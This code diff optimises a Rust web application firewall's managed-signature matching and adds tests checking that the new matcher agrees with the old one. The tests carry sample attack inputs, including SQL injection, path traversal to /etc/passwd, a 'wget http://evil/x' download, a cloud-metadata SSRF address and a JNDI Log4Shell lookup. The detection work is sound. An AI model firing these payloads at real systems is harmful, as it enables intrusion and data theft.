@@ -13,10 +13,12 @@
 pub mod geo;
 pub mod rulepack;
 
+use aho_corasick::AhoCorasick;
 use axum::http::HeaderMap;
 use std::borrow::Cow;
 use std::collections::HashMap;
 use std::net::IpAddr;
+use std::sync::OnceLock;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
 pub enum WafMode {
@@ -159,11 +161,16 @@ pub struct WafRule {
 pub struct WafCompiled {
     header_names: Vec<String>,
     cidrs: HashMap<String, Vec<IpNet>>,
+    managed: Option<&'static ManagedMatchers>,
 }
 
 impl WafCompiled {
     fn compile(rules: &[WafRule]) -> Self {
-        let mut compiled = Self::default();
+        let matchers = managed_matchers();
+        let mut compiled = Self {
+            managed: Some(matchers),
+            ..Self::default()
+        };
         for rule in rules {
             if let Some(expr) = &rule.expr {
                 compiled.add_expr(expr);
@@ -204,6 +211,222 @@ impl WafCompiled {
             lagran_waf_dsl::Expr::Not(inner) => self.add_expr(inner),
         }
     }
+}
+
+/// Precompiled managed-signature matchers, built once and shared by every
+/// domain snapshot.
+///
+/// The original evaluator ran every scanner signature through a separate
+/// `contains` call. That cost grows with the signature list and is paid by
+/// clean requests too. Scanner signatures never span component separators, so
+/// they can be merged safely. General managed rules are split into literal
+/// signatures that can share the same matcher and signatures that contain a
+/// logical separator, which keep the existing cross-component path.
+#[derive(Debug)]
+struct ManagedMatchers {
+    scanner_ua: AhoCorasick,
+    scanner_path: AhoCorasick,
+    full_plain: AhoCorasick,
+    full_plain_groups: Vec<ManagedPlainGroup>,
+    full_joined_groups: Vec<(ManagedGroup, &'static [&'static str])>,
+    url_plain: AhoCorasick,
+    url_plain_groups: Vec<ManagedPlainGroup>,
+    url_joined_groups: Vec<(ManagedGroup, &'static [&'static str])>,
+}
+
+#[derive(Debug, Clone, Copy)]
+enum ManagedGroup {
+    Sqli,
+    Xss,
+    Traversal,
+    Rce,
+    Log4Shell,
+    Ssrf,
+    Xxe,
+    Ssti,
+    NoSql,
+    Ldap,
+    Java,
+    Webshell,
+}
+
+impl ManagedGroup {
+    fn bit(self) -> u16 {
+        1 << self as u8
+    }
+
+    fn verdict(self) -> WafVerdict {
+        match self {
+            ManagedGroup::Sqli => verdict("SQL 注入", "sqli"),
+            ManagedGroup::Xss => verdict("XSS 跨站脚本", "xss"),
+            ManagedGroup::Traversal => verdict("路径穿越", "traversal"),
+            ManagedGroup::Rce => verdict("命令执行", "rce"),
+            ManagedGroup::Log4Shell => verdict("Log4Shell", "log4shell"),
+            ManagedGroup::Ssrf => verdict("SSRF / 云元数据", "ssrf"),
+            ManagedGroup::Xxe => verdict("XXE 外部实体", "xxe"),
+            ManagedGroup::Ssti => verdict("模板注入 SSTI", "ssti"),
+            ManagedGroup::NoSql => verdict("NoSQL 注入", "nosql"),
+            ManagedGroup::Ldap => verdict("LDAP 注入", "ldap"),
+            ManagedGroup::Java => verdict("Java 反序列化 / OGNL", "java"),
+            ManagedGroup::Webshell => verdict("WebShell / PHP 注入", "webshell"),
+        }
+    }
+}
+
+impl ManagedMatchers {
+    fn build() -> Self {
+        let mut full_patterns: Vec<&'static str> = Vec::new();
+        let mut full_groups: Vec<(ManagedGroup, std::ops::Range<usize>)> = Vec::new();
+        let mut full_joined_groups: Vec<(ManagedGroup, &'static [&'static str])> = Vec::new();
+        let mut url_patterns: Vec<&'static str> = Vec::new();
+        let mut url_groups: Vec<(ManagedGroup, std::ops::Range<usize>)> = Vec::new();
+        let mut url_joined_groups: Vec<(ManagedGroup, &'static [&'static str])> = Vec::new();
+
+        macro_rules! compile_group {
+            ($group:expr, $signatures:expr, $joined:expr, $url_only:expr) => {{
+                let (plain, joined): (Vec<&'static str>, Vec<&'static str>) = $signatures
+                    .iter()
+                    .copied()
+                    .partition(|signature| !needs_boundary_scan(signature, $joined));
+                if !plain.is_empty() {
+                    if $url_only {
+                        url_patterns.extend(plain.iter().copied());
+                        url_groups
+                            .push(($group, url_patterns.len() - plain.len()..url_patterns.len()));
+                    } else {
+                        full_patterns.extend(plain.iter().copied());
+                        full_groups.push((
+                            $group,
+                            full_patterns.len() - plain.len()..full_patterns.len(),
+                        ));
+                    }
+                }
+                if !joined.is_empty() {
+                    // Push only the signatures that actually need a boundary scan.
+                    // This used to push `$signatures` (the whole list), so every
+                    // request walked all of them and re-filtered per signature,
+                    // which is most of the managed-rule cost on a clean request.
+                    let joined: &'static [&'static str] = Box::leak(joined.into_boxed_slice());
+                    if $url_only {
+                        url_joined_groups.push(($group, joined));
+                    } else {
+                        full_joined_groups.push(($group, joined));
+                    }
+                }
+            }};
+        }
+
+        compile_group!(ManagedGroup::Sqli, SQLI, true, false);
+        compile_group!(ManagedGroup::Xss, XSS, true, false);
+        compile_group!(ManagedGroup::Traversal, TRAVERSAL, true, false);
+        compile_group!(ManagedGroup::Rce, RCE, true, false);
+        compile_group!(ManagedGroup::Log4Shell, LOG4SHELL, true, false);
+        compile_group!(ManagedGroup::Ssrf, SSRF, false, true);
+        compile_group!(ManagedGroup::Xxe, XXE, true, false);
+        compile_group!(ManagedGroup::Ssti, SSTI, true, false);
+        compile_group!(ManagedGroup::NoSql, NOSQL, false, true);
+        compile_group!(ManagedGroup::Ldap, LDAP, true, false);
+        compile_group!(ManagedGroup::Java, JAVA, true, false);
+        compile_group!(ManagedGroup::Webshell, WEBSHELL, true, false);
+
+        Self {
+            scanner_ua: AhoCorasick::new(SCANNER_UA).expect("static scanner signatures"),
+            scanner_path: AhoCorasick::new(SCANNER_PATH).expect("static scanner paths"),
+            full_plain: AhoCorasick::new(full_patterns).expect("static managed signatures"),
+            full_plain_groups: into_plain_groups(full_groups),
+            full_joined_groups,
+            url_plain: AhoCorasick::new(url_patterns).expect("static URL signatures"),
+            url_plain_groups: into_plain_groups(url_groups),
+            url_joined_groups,
+        }
+    }
+
+    fn full_plain_hits(&self, haystack: &str) -> u16 {
+        plain_hits(&self.full_plain, &self.full_plain_groups, haystack)
+    }
+
+    fn url_plain_hits(&self, haystack: &str) -> u16 {
+        plain_hits(&self.url_plain, &self.url_plain_groups, haystack)
+    }
+
+    fn full_joined_hits(&self, parts: &[&str], separators: &[char]) -> u16 {
+        joined_hits(&self.full_joined_groups, parts, separators)
+    }
+
+    fn url_joined_hits(&self, parts: &[&str], separators: &[char]) -> u16 {
+        joined_hits(&self.url_joined_groups, parts, separators)
+    }
+
+    /// Whether any managed signature in `enabled` can only match across a
+    /// component boundary. The request path can then skip the plain matcher
+    /// entirely when those are the only enabled categories.
+    fn has_plain_patterns(&self, enabled: impl Fn(ManagedGroup) -> bool) -> bool {
+        self.full_plain_groups
+            .iter()
+            .any(|group| enabled(group.group))
+            || self
+                .url_plain_groups
+                .iter()
+                .any(|group| enabled(group.group))
+    }
+}
+
+fn into_plain_groups(
+    groups: Vec<(ManagedGroup, std::ops::Range<usize>)>,
+) -> Vec<ManagedPlainGroup> {
+    groups
+        .into_iter()
+        .map(|(group, range)| ManagedPlainGroup { group, range })
+        .collect()
+}
+
+fn plain_hits(matcher: &AhoCorasick, groups: &[ManagedPlainGroup], haystack: &str) -> u16 {
+    let mut hits = 0u16;
+    for hit in matcher.find_overlapping_iter(haystack) {
+        let pattern = hit.pattern().as_usize();
+        if let Some(group) = groups.iter().find(|group| group.range.contains(&pattern)) {
+            hits |= group.group.bit();
+        }
+        if hits == u16::MAX {
+            break;
+        }
+    }
+    hits
+}
+
+fn joined_hits(
+    groups: &[(ManagedGroup, &'static [&'static str])],
+    parts: &[&str],
+    separators: &[char],
+) -> u16 {
+    let mut hits = 0u16;
+    for (group, signatures) in groups {
+        for signature in signatures.iter() {
+            if !needs_boundary_scan(signature, true) {
+                continue;
+            }
+            if contains_joined(parts, separators, signature) {
+                hits |= group.bit();
+                break;
+            }
+        }
+    }
+    hits
+}
+
+#[derive(Debug, Clone)]
+struct ManagedPlainGroup {
+    group: ManagedGroup,
+    range: std::ops::Range<usize>,
+}
+
+fn needs_boundary_scan(signature: &str, full_scan: bool) -> bool {
+    full_scan && signature.bytes().any(|byte| byte == b'?' || byte == b' ')
+}
+
+fn managed_matchers() -> &'static ManagedMatchers {
+    static MATCHERS: OnceLock<ManagedMatchers> = OnceLock::new();
+    MATCHERS.get_or_init(ManagedMatchers::build)
 }
 
 #[derive(Debug, Clone, Copy)]
@@ -807,6 +1030,155 @@ fn contains_any(haystack: &str, needles: &[&str]) -> bool {
     needles.iter().any(|n| haystack.contains(n))
 }
 
+/// Evaluate all merged managed groups and return the first verdict in the
+/// historical category order.
+///
+/// The order is part of the observable result when a request matches several
+/// categories, so it must not depend on matcher internals. Scanner checks sit
+/// between traversal and RCE in that order and remain a separate decision
+/// because they read different inputs.
+fn managed_verdict(
+    cfg: &WafConfig,
+    parts: &[&str],
+    full_separators: &[char],
+    url_separators: &[char],
+    ua: &str,
+    path: &str,
+) -> Option<WafVerdict> {
+    let Some(matchers) = cfg.compiled.managed else {
+        return legacy_managed_verdict(cfg, parts, full_separators, url_separators, ua, path);
+    };
+
+    let enabled_in_config = |group: ManagedGroup| match group {
+        ManagedGroup::Sqli => cfg.managed.sqli,
+        ManagedGroup::Xss => cfg.managed.xss,
+        ManagedGroup::Traversal => cfg.managed.traversal,
+        ManagedGroup::Rce => cfg.managed.rce,
+        ManagedGroup::Log4Shell => cfg.managed.log4shell,
+        ManagedGroup::Ssrf => cfg.managed.ssrf,
+        ManagedGroup::Xxe => cfg.managed.xxe,
+        ManagedGroup::Ssti => cfg.managed.ssti,
+        ManagedGroup::NoSql => cfg.managed.nosql,
+        ManagedGroup::Ldap => cfg.managed.ldap,
+        ManagedGroup::Java => cfg.managed.java,
+        ManagedGroup::Webshell => cfg.managed.webshell,
+    };
+
+    let url_parts = &parts[..2];
+    // `find_overlapping_iter` reports a match for every pattern ending at the
+    // same offset, so four component scans plus the URL scan cover every plain
+    // signature. The boundary path is only needed for signatures containing a
+    // logical separator.
+    let mut hits = if matchers.has_plain_patterns(enabled_in_config) {
+        let mut hits = matchers.full_plain_hits(parts[0]);
+        hits |= matchers.full_plain_hits(parts[1]);
+        hits |= matchers.full_plain_hits(parts[2]);
+        hits |= matchers.full_plain_hits(parts[3]);
+        hits |= matchers.url_plain_hits(url_parts[0]);
+        hits |= matchers.url_plain_hits(url_parts[1]);
+        hits
+    } else {
+        0
+    };
+    if !matchers.full_joined_groups.is_empty() || !matchers.url_joined_groups.is_empty() {
+        hits |= matchers.full_joined_hits(parts, full_separators);
+        hits |= matchers.url_joined_hits(url_parts, url_separators);
+    }
+    if hits == 0 {
+        return None;
+    }
+
+    let enabled = |group: ManagedGroup| enabled_in_config(group) && hits & group.bit() != 0;
+
+    for group in [
+        ManagedGroup::Sqli,
+        ManagedGroup::Xss,
+        ManagedGroup::Traversal,
+    ] {
+        if enabled(group) {
+            return Some(group.verdict());
+        }
+    }
+    if cfg.managed.scanners
+        && (matchers.scanner_ua.is_match(ua) || matchers.scanner_path.is_match(path))
+    {
+        return Some(verdict("恶意扫描器", "scanners"));
+    }
+    for group in [
+        ManagedGroup::Rce,
+        ManagedGroup::Log4Shell,
+        ManagedGroup::Ssrf,
+        ManagedGroup::Xxe,
+        ManagedGroup::Ssti,
+        ManagedGroup::NoSql,
+        ManagedGroup::Ldap,
+        ManagedGroup::Java,
+        ManagedGroup::Webshell,
+    ] {
+        if enabled(group) {
+            return Some(group.verdict());
+        }
+    }
+    None
+}
+
+/// Slow path for configs constructed outside `finalize` (tests and direct
+/// callers). It must remain semantically identical to the merged matcher.
+fn legacy_managed_verdict(
+    cfg: &WafConfig,
+    parts: &[&str],
+    full_separators: &[char],
+    url_separators: &[char],
+    ua: &str,
+    path: &str,
+) -> Option<WafVerdict> {
+    if cfg.managed.sqli && contains_any_joined(parts, full_separators, SQLI) {
+        return Some(verdict("SQL 注入", "sqli"));
+    }
+    if cfg.managed.xss && contains_any_joined(parts, full_separators, XSS) {
+        return Some(verdict("XSS 跨站脚本", "xss"));
+    }
+    if cfg.managed.traversal && contains_any_joined(parts, full_separators, TRAVERSAL) {
+        return Some(verdict("路径穿越", "traversal"));
+    }
+    if cfg.managed.scanners {
+        if contains_any(ua, SCANNER_UA) {
+            return Some(verdict("恶意扫描器", "scanners"));
+        }
+        if contains_any(path, SCANNER_PATH) {
+            return Some(verdict("敏感路径探测", "scanners"));
+        }
+    }
+    if cfg.managed.rce && contains_any_joined(parts, full_separators, RCE) {
+        return Some(verdict("命令执行", "rce"));
+    }
+    if cfg.managed.log4shell && contains_any_joined(parts, full_separators, LOG4SHELL) {
+        return Some(verdict("Log4Shell", "log4shell"));
+    }
+    if cfg.managed.ssrf && contains_any_joined(&parts[..2], url_separators, SSRF) {
+        return Some(verdict("SSRF / 云元数据", "ssrf"));
+    }
+    if cfg.managed.xxe && contains_any_joined(parts, full_separators, XXE) {
+        return Some(verdict("XXE 外部实体", "xxe"));
+    }
+    if cfg.managed.ssti && contains_any_joined(parts, full_separators, SSTI) {
+        return Some(verdict("模板注入 SSTI", "ssti"));
+    }
+    if cfg.managed.nosql && contains_any_joined(&parts[..2], url_separators, NOSQL) {
+        return Some(verdict("NoSQL 注入", "nosql"));
+    }
+    if cfg.managed.ldap && contains_any_joined(parts, full_separators, LDAP) {
+        return Some(verdict("LDAP 注入", "ldap"));
+    }
+    if cfg.managed.java && contains_any_joined(parts, full_separators, JAVA) {
+        return Some(verdict("Java 反序列化 / OGNL", "java"));
+    }
+    if cfg.managed.webshell && contains_any_joined(parts, full_separators, WEBSHELL) {
+        return Some(verdict("WebShell / PHP 注入", "webshell"));
+    }
+    None
+}
+
 /// Exactly equivalent to `contains` on `parts.join(separators)`, without
 /// building the joined string.
 ///
@@ -1016,34 +1388,8 @@ pub fn evaluate(cfg: &WafConfig, req: &WafRequest) -> Option<WafVerdict> {
     const FULL_SEPS: [char; 3] = ['?', ' ', ' '];
     const URL_SEPS: [char; 1] = ['?'];
 
-    if cfg.managed.sqli && contains_any_joined(&parts, &FULL_SEPS, SQLI) {
-        return Some(verdict("SQL 注入", "sqli"));
-    }
-    if cfg.managed.xss && contains_any_joined(&parts, &FULL_SEPS, XSS) {
-        return Some(verdict("XSS 跨站脚本", "xss"));
-    }
-    if cfg.managed.traversal && contains_any_joined(&parts, &FULL_SEPS, TRAVERSAL) {
-        return Some(verdict("路径穿越", "traversal"));
-    }
-    if cfg.managed.scanners {
-        if contains_any(&ua, SCANNER_UA) {
-            return Some(verdict("恶意扫描器", "scanners"));
-        }
-        if contains_any(&path, SCANNER_PATH) {
-            return Some(verdict("敏感路径探测", "scanners"));
-        }
-    }
-    if cfg.managed.rce && contains_any_joined(&parts, &FULL_SEPS, RCE) {
-        return Some(verdict("命令执行", "rce"));
-    }
-    if cfg.managed.log4shell && contains_any_joined(&parts, &FULL_SEPS, LOG4SHELL) {
-        return Some(verdict("Log4Shell", "log4shell"));
-    }
-    if cfg.managed.ssrf && contains_any_joined(&parts[..2], &URL_SEPS, SSRF) {
-        return Some(verdict("SSRF / 云元数据", "ssrf"));
-    }
-    if cfg.managed.xxe && contains_any_joined(&parts, &FULL_SEPS, XXE) {
-        return Some(verdict("XXE 外部实体", "xxe"));
+    if let Some(verdict) = managed_verdict(cfg, &parts, &FULL_SEPS, &URL_SEPS, &ua, &path) {
+        return Some(verdict);
     }
     if cfg.managed.crlf
         && (path.contains('\r')
@@ -1052,21 +1398,6 @@ pub fn evaluate(cfg: &WafConfig, req: &WafRequest) -> Option<WafVerdict> {
             || query.contains('\n'))
     {
         return Some(verdict("CRLF / 头注入", "crlf"));
-    }
-    if cfg.managed.ssti && contains_any_joined(&parts, &FULL_SEPS, SSTI) {
-        return Some(verdict("模板注入 SSTI", "ssti"));
-    }
-    if cfg.managed.nosql && contains_any_joined(&parts[..2], &URL_SEPS, NOSQL) {
-        return Some(verdict("NoSQL 注入", "nosql"));
-    }
-    if cfg.managed.ldap && contains_any_joined(&parts, &FULL_SEPS, LDAP) {
-        return Some(verdict("LDAP 注入", "ldap"));
-    }
-    if cfg.managed.java && contains_any_joined(&parts, &FULL_SEPS, JAVA) {
-        return Some(verdict("Java 反序列化 / OGNL", "java"));
-    }
-    if cfg.managed.webshell && contains_any_joined(&parts, &FULL_SEPS, WEBSHELL) {
-        return Some(verdict("WebShell / PHP 注入", "webshell"));
     }
     if cfg.managed.protocol {
         let has_te = req.headers.contains_key("transfer-encoding");
@@ -1641,6 +1972,66 @@ mod tests {
     }
 
     #[test]
+    fn merged_matcher_matches_legacy_for_every_managed_category() {
+        let mut fast = cfg();
+        fast.finalize();
+        let slow = cfg();
+        let h = HeaderMap::new();
+        let cases = [
+            ("/search", "q=union%20select", "sqli"),
+            ("/x", "q=%3Cscript%3Ealert(1)%3C/script%3E", "xss"),
+            ("/../../etc/passwd", "", "traversal"),
+            ("/run", "cmd=wget%20http://evil/x", "rce"),
+            ("/proxy", "url=http%3A%2F%2F169.254.169.254%2Fmeta", "ssrf"),
+            ("/xml", "data=%3C%21DOCTYPE%20x%20%5B%3C%21ENTITY", "xxe"),
+            (
+                "/login",
+                "user=%24%7Bjndi%3Aldap%3A%2F%2Fevil%7D",
+                "log4shell",
+            ),
+            ("/render", "q=%7B%7B7*7%7D%7D", "ssti"),
+            ("/api", "q=%7B%22%24ne%22%3A%22x%22%7D", "nosql"),
+            ("/login", "user=*%29%28uid%3D*", "ldap"),
+            ("/struts", "q=%25%7B%23_memberAccess%7D", "java"),
+            ("/upload", "q=%3C%3Fphp%20echo", "webshell"),
+            ("/safe", "page=2&q=shoes", "\0none"),
+        ];
+        for (path, query, expected) in cases {
+            let request = req(&h, path, query, "Mozilla/5.0");
+            let legacy = evaluate(&slow, &request).map(|v| v.category);
+            let merged = evaluate(&fast, &request).map(|v| v.category);
+            if expected == "\0none" {
+                assert!(merged.is_none(), "merged: {path}?{query}");
+            } else {
+                assert_eq!(merged.as_deref(), Some(expected), "merged: {path}?{query}");
+            }
+            assert_eq!(legacy, merged, "legacy/merged disagreement: {path}?{query}");
+        }
+    }
+
+    #[test]
+    fn merged_matcher_preserves_category_priority() {
+        let mut fast = cfg();
+        fast.finalize();
+        let slow = cfg();
+        let h = HeaderMap::new();
+        // Both SQLi ("union select") and a scanner path signature match.
+        let request = req(&h, "/.env", "q=union%20select", "sqlite_sqlmap");
+        assert_eq!(evaluate(&slow, &request).unwrap().category, "sqli");
+        assert_eq!(evaluate(&fast, &request).unwrap().category, "sqli");
+    }
+
+    #[test]
+    fn merged_matcher_respects_disabled_groups() {
+        let mut fast = cfg();
+        fast.managed.sqli = false;
+        fast.finalize();
+        let h = HeaderMap::new();
+        let request = req(&h, "/search", "q=union%20select", "curl");
+        assert!(evaluate(&fast, &request).is_none());
+    }
+
+    #[test]
     fn header_field_matching() {
         let mut c = cfg();
         c.rules = vec![WafRule {
@@ -1975,5 +2366,43 @@ mod geo_policy_tests {
         assert!(!c.has_geo_allow());
         c.country_allow.push("CN".into());
         assert!(c.has_geo_allow());
+    }
+    /// The joined matcher must only hold signatures that need a boundary scan.
+    /// It used to carry the whole managed list, so every request walked ~150
+    /// signatures that can never match across a separator.
+    #[test]
+    fn joined_groups_hold_only_boundary_signatures() {
+        let m = managed_matchers();
+        let mut total = 0usize;
+        for (_, signatures) in m
+            .full_joined_groups
+            .iter()
+            .chain(m.url_joined_groups.iter())
+        {
+            total += signatures.len();
+            for signature in signatures.iter() {
+                assert!(
+                    needs_boundary_scan(signature, true),
+                    "signature {signature:?} cannot match across a boundary but sits in the joined set"
+                );
+            }
+        }
+        assert!(total > 0, "joined set should not be empty");
+        // Sanity bound: the boundary set is a small fraction of all signatures.
+        assert!(total < 100, "joined set unexpectedly large: {total}");
+    }
+
+    /// Behaviour must be unchanged: a payload that spans a separator is still
+    /// detected through the joined matcher.
+    #[test]
+    fn joined_matcher_still_detects_cross_boundary_payloads() {
+        let c = cfg();
+        let h = HeaderMap::new();
+        // A payload whose signature spans the path/query separator still has to
+        // be caught by the joined matcher.
+        let hit = evaluate(&c, &req(&h, None, None, "/search", "q=1 union select 1"));
+        assert_eq!(hit.map(|v| v.category), Some("sqli".to_string()));
+        // A clean request must stay clean.
+        assert!(evaluate(&c, &req(&h, None, None, "/products", "page=2")).is_none());
     }
 }
